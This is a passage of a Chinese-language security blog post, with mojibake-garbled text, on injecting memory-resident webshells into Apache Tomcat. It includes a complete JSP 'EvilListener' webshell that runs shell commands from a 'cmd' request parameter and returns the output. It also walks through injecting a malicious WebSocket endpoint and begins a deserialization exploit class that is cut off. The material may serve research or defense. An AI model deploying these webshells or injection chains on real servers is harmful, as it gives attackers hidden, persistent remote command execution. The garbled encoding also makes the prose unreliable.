æ­¤æ³¨å…¥Listenerå†…å­˜é©¬çš„æ–¹æ³•å°±å¾ˆç®€å•äº†ã€‚è·å–åˆ°StandardContextåç›´æ¥è°ƒç”¨addApplicationEventListeneræ–¹æ³•ä¼ å…¥è¦æ³¨å…¥çš„Listenerå³å¯ã€‚</p><h4 id="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Listener-å‹å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥Tomcat-Listener-å‹å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥Tomcat-Listener å‹å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥Tomcat-Listener å‹å†…å­˜é©¬</h4><p>è¿‡äºç®€å•ï¼Œäº¤ç»™è¯»è€…å®Œæˆã€‚ï¼ˆå…¶å®æ˜¯æˆ‘å®åœ¨æ‡’å¾—å†™äº†ï¼Œå˜»å˜»ï½ï¼‰</p><h4 id="jspæ³¨å…¥Tomcat-Listener-å‹å†…å­˜é©¬"><a href="#jspæ³¨å…¥Tomcat-Listener-å‹å†…å­˜é©¬" class="headerlink" title="jspæ³¨å…¥Tomcat-Listener å‹å†…å­˜é©¬"></a>jspæ³¨å…¥Tomcat-Listener å‹å†…å­˜é©¬</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(evilListener);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Websocket-å‹å†…å­˜é©¬"><a href="#Tomcat-Websocket-å‹å†…å­˜é©¬" class="headerlink" title="Tomcat-Websocket å‹å†…å­˜é©¬"></a>Tomcat-Websocket å‹å†…å­˜é©¬</h3><p>WebSocketæ˜¯ä¸€ç§å…¨åŒå·¥é€šä¿¡åè®®ï¼Œå³å®¢æˆ·ç«¯å¯ä»¥å‘æœåŠ¡ç«¯å‘é€è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ã€‚è¿™æ ·çš„ç‰¹ç‚¹ï¼Œä½¿å¾—å®ƒåœ¨ä¸€äº›å®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„åœºæ™¯æ•ˆæœæ–ç„¶ï¼ˆæ¯”å¦‚å¾®ä¿¡æœ‹å‹åœˆå®æ—¶é€šçŸ¥ã€åœ¨çº¿ååŒç¼–è¾‘ç­‰ï¼‰ã€‚ä¸»æµæµè§ˆå™¨ä»¥åŠä¸€äº›å¸¸è§æœåŠ¡ç«¯é€šä¿¡æ¡†æ¶ï¼ˆTomcatã€nettyã€undertowã€webLogicç­‰ï¼‰éƒ½å¯¹WebSocketè¿›è¡Œäº†æŠ€æœ¯æ”¯æŒã€‚</p><h4 id="æµç¨‹åˆ†æ-3"><a href="#æµç¨‹åˆ†æ-3" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h4><p>å¯¼å…¥ä¾èµ–ï¼Œåº”ä¸è‡ªå·±çš„Tomcatç‰ˆæœ¬ä¸€è‡´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Tomcat-Websocketæ ·ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="keyword">new</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Receice message: &quot;</span>+message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;Websocket: &quot;</span> + session.toString());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            session.getBasicRemote().sendText(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, CloseReason closeReason)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Close!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable throwable)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Error!!!&quot;</span>);</span><br><span class="line">        throwable.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EndpointApplicationConfig</span> <span class="keyword">implements</span> <span class="title class_">ServerApplicationConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ServerEndpointConfig&gt; <span class="title function_">getEndpointConfigs</span><span class="params">(Set&lt;Class&lt;? extends Endpoint&gt;&gt; set)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Set&lt;ServerEndpointConfig&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (set.contains(HelloWebsocket.class)) &#123;</span><br><span class="line">            result.add(ServerEndpointConfig.Builder.create(HelloWebsocket.class, <span class="string">&quot;/websocket&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Class&lt;?&gt;&gt; getAnnotatedEndpointClasses(Set&lt;Class&lt;?&gt;&gt; set) &#123;</span><br><span class="line">        System.out.println(set);</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¯ä»¥ç”¨ä»¥ä¸‹pythonä»£ç è¿æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/websocket&quot;</span>)</span><br><span class="line">ws.send(<span class="string">&quot;HELLO&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ws.recv())</span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure><p>åœ¨äº†è§£Tomcat-Websocketçš„åŠ è½½ä¹‹å‰ï¼Œéœ€è¦å…ˆäº†è§£ä¸€ä¸‹Tomcatçš„SCIæœºåˆ¶ã€‚è¿™é‡Œè´´ä¸€ç¯‡å…³äºSCIæœºåˆ¶çš„æ–‡ç« å§ï¼š<a href="https://blog.csdn.net/lqzkcx3/article/details/78507169">https://blog.csdn.net/lqzkcx3/article/details/78507169</a></p><blockquote><ol><li><p>ServletContainerInitializeræ¥å£çš„å®ç°ç±»é€šè¿‡java SPIå£°æ˜è‡ªå·±æ˜¯ServletContainerInitializer çš„provider.</p></li><li><p>å®¹å™¨å¯åŠ¨é˜¶æ®µä¾æ®java spiè·å–åˆ°æ‰€æœ‰ServletContainerInitializerçš„å®ç°ç±»ï¼Œç„¶åæ‰§è¡Œå…¶onStartupæ–¹æ³•.</p></li><li><p>å¦å¤–åœ¨å®ç°ServletContainerInitializeræ—¶è¿˜å¯ä»¥é€šè¿‡@HandlesTypesæ³¨è§£å®šä¹‰æœ¬å®ç°ç±»å¸Œæœ›å¤„ç†çš„ç±»å‹ï¼Œå®¹å™¨ä¼šå°†å½“å‰åº”ç”¨ä¸­æ‰€æœ‰è¿™ä¸€ç±»å‹ï¼ˆç»§æ‰¿æˆ–è€…å®ç°ï¼‰çš„ç±»æ”¾åœ¨ServletContainerInitializeræ¥å£çš„é›†åˆå‚æ•°cä¸­ä¼ é€’è¿›æ¥ã€‚å¦‚æœä¸å®šä¹‰å¤„ç†ç±»å‹ï¼Œæˆ–è€…åº”ç”¨ä¸­ä¸å­˜åœ¨ç›¸åº”çš„å®ç°ç±»ï¼Œåˆ™é›†åˆå‚æ•°cä¸ºç©º.</p></li><li><p>è¿™ä¸€ç±»å®ç°äº† SCI çš„æ¥å£ï¼Œå¦‚æœåšä¸ºç‹¬ç«‹çš„åŒ…å‘å¸ƒï¼Œåœ¨æ‰“åŒ…æ—¶ï¼Œä¼šåœ¨JAR æ–‡ä»¶çš„ META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer æ–‡ä»¶ä¸­è¿›è¡Œæ³¨å†Œã€‚ å®¹å™¨åœ¨å¯åŠ¨æ—¶ï¼Œå°±ä¼šæ‰«ææ‰€æœ‰å¸¦æœ‰è¿™äº›æ³¨å†Œä¿¡æ¯çš„ç±»(@HandlesTypes(WebApplicationInitializer.class)è¿™é‡Œå°±æ˜¯åŠ è½½WebApplicationInitializer.classç±»)è¿›è¡Œè§£æï¼Œå¯åŠ¨æ—¶ä¼šè°ƒç”¨å…¶ onStartupæ–¹æ³•â€”â€”ä¹Ÿå°±æ˜¯è¯´servletå®¹å™¨è´Ÿè´£åŠ è½½è¿™äº›æŒ‡å®šç±», è€ŒServletContainerInitializerçš„å®ç°è€…(ä¾‹å¦‚Spring-webä¸­çš„SpringServletContainerInitializerå¯¹æ¥å£ServletContainerInitializerçš„å®ç°ä¸­,æ˜¯å¯ä»¥ç›´æ¥è·å–åˆ°è¿™äº›ç±»çš„)</p></li></ol></blockquote><p>å¤§è‡´æ„æ€å°±æ˜¯è¯´åœ¨Tomcatå¯åŠ¨çš„æ—¶å€™ï¼Œå°†ä¼šå¯¹classpathä¸‹çš„jarè¿›è¡Œæ‰«æï¼Œæ‰«æåŒ…ä¸­çš„META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializeræ–‡ä»¶ï¼Œå¯¹å…¶ä¸­æåˆ°çš„ç±»è¿›è¡ŒåŠ è½½ï¼Œè°ƒç”¨è¿™ä¸ªç±»çš„onStartupæ–¹æ³•ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹tomcat-websocket.jarä¸­çš„META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializeræ–‡ä»¶ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f761ddac507cc092ce8.jpg" title="image-20230803185757146" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f761ddac507cc092ce8.jpg" alt="image-20230803185757146"></a></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨org.apache.tomcat.websocket.server.WsSci#onStartupä¸‹æ‰“æ–­ç‚¹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f841ddac507cc095024.jpg" title="image-20230803185916462" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f841ddac507cc095024.jpg" alt="image-20230803185916462"></a></p><p>é¦–å…ˆè°ƒç”¨<code>init</code>è¿›è¡Œåˆå§‹åŒ–æ“ä½œWsServerContainerå¯¹è±¡ï¼Œè·Ÿè¿›ä¸€ä¸‹initæ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f8f1ddac507cc096c47.jpg" title="image-20230804000010834" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f8f1ddac507cc096c47.jpg" alt="image-20230804000010834"></a></p><p>åˆ›å»ºäº†ä¸€ä¸ªWsServerContainerå¯¹è±¡scï¼Œå‚æ•°ä¸ºservletContextå¯¹è±¡ã€‚ä¹‹åè°ƒç”¨servletContextçš„setAttribute()æ–¹æ³•ï¼Œå°†servletContextçš„<code>javax.websocket.server.ServerContainer</code>å±æ€§è®¾ç½®ä¸ºscï¼Œå¹¶æ·»åŠ äº†ä¸¤ä¸ªlistenerï¼Œä¸€ä¸ªæ˜¯WsSessionListenerï¼Œä¸€ä¸ªæ˜¯WsContextListenerã€‚æ·»åŠ WsSessionListenerçš„ä½œç”¨æ˜¯å½“httpçš„sessioné”€æ¯æ—¶åŒæ ·é”€æ¯æ‰websocket sessionï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26f9b1ddac507cc09893d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26f9b1ddac507cc09893d.jpg"></a></p><p>ä¸è¿‡å› ä¸ºæˆ‘ä»¬æ˜¯æ³¨å…¥å†…å­˜é©¬ï¼Œåªéœ€è¦äº†è§£æ³¨å†Œè¿‡ç¨‹å³å¯ï¼Œå¹¶ä¸éœ€è¦å¤ªæ³¨æ„å®ƒçš„ä½œç”¨ã€‚ä¹‹åå°†ä¸€ä¸ª<code>ServerEndpointConfig</code>å¯¹è±¡ä¼ ç»™äº†scçš„<code>addEndpoint</code>æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26fa71ddac507cc09a55b.jpg" title="image-20230804000414760" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fa71ddac507cc09a55b.jpg" alt="image-20230804000414760"></a></p><p>è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªaddEndpointæ–¹æ³•ï¼Œè¿™é‡Œè·å–åˆ° pathï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26fc81ddac507cc09f576.jpg" title="image-20230804000617613" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fc81ddac507cc09f576.jpg" alt="image-20230804000617613"></a></p><p>åœ¨å–å‡ºäº†å…¶ä¸­é…ç½®çš„è·¯ç”±ä¹‹åç”Ÿæˆäº†ä¸€ä¸ªmappingæ˜ å°„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d26fd21ddac507cc0a1256.jpg" title="image-20230804000745093" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d26fd21ddac507cc0a1256.jpg" alt="image-20230804000745093"></a></p><p>æ¥ä¸‹æ¥æ€»ç»“ä¸€ä¸‹æ³¨å…¥æµç¨‹ï¼š</p><p>1.åˆ›å»ºä¸€ä¸ªæ¶æ„çš„Endpointï¼Œå®ç°MessageHandleræ¥å£ï¼Œé‡å†™onMessageæ–¹æ³•ã€‚</p><p>2.ä¸ºè¯¥Endpointåˆ›å»ºServerEndpointConfigã€‚</p><p>3.è·å–servletContextçš„<code>javax.websocket.server.ServerContainer</code>å±æ€§å¾—åˆ°WsServerContainer</p><p>4.é€šè¿‡<code>WsServerContainer.addEndpoint</code>æ·»åŠ ServerEndpointConfig</p><h4 id="ååºåˆ—åŒ–æ³¨å…¥-Tomcat-Websocket-å‹å†…å­˜é©¬"><a href="#ååºåˆ—åŒ–æ³¨å…¥-Tomcat-Websocket-å‹å†…å­˜é©¬" class="headerlink" title="ååºåˆ—åŒ–æ³¨å…¥ Tomcat-Websocket å‹å†…å­˜é©¬"></a>ååºåˆ—åŒ–æ³¨å…¥ Tomcat-Websocket å‹å†…å­˜é©¬</h4><p>å›æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¹‹å‰æ˜¯æ€æ ·åˆ›å»ºä¸€ä¸ªæ¶æ„çš„Filterå¯¹è±¡æˆ–è€…ä¸€ä¸ªæ¶æ„çš„Servletå¯¹è±¡çš„ï¼Ÿæˆ‘ä»¬æ˜¯ç›´æ¥è®©TemplatesImplå¯¹è±¡çš„_bytecodeså­—æ®µæ‰€å¯¹åº”çš„é‚£ä¸ªç±»å®ç°äº†Filteræ¥å£æˆ–Servletæ¥å£ï¼Œä½†æ˜¯ç°åœ¨æˆ‘ä»¬ä¸èƒ½ç»§ç»­é€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„Endpointäº†ã€‚å› ä¸ºè¿™ä¸ªç±»å¿…éœ€è¦ç»§æ‰¿AbstractTransletï¼Œå› æ­¤å°±æ— æ³•å†ç»§æ‰¿Endpointäº†ã€‚é‚£æˆ‘ä»¬è¿˜æœ‰ä»€ä¹ˆåŠæ³•å—ï¼Ÿå½“ç„¶æ˜¯é€šè¿‡ClassLoaderçš„defineClassæ¥å‘JVMä¸­æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Endpointäº†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Thread.*currentThread*().getContextClassLoader()</code>æ¥è·å–ClassLoaderï¼Œä¹‹åé€šè¿‡åå°„çš„æ–¹æ³•ï¼Œæ‰§è¡ŒdefineClassæ–¹æ³•ï¼Œå°†æˆ‘ä»¬è®¾ç½®å¥½çš„byteæ•°ç»„è½¬å˜ä¸ºjavaç±»ã€‚å…·ä½“è¯·çœ‹ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 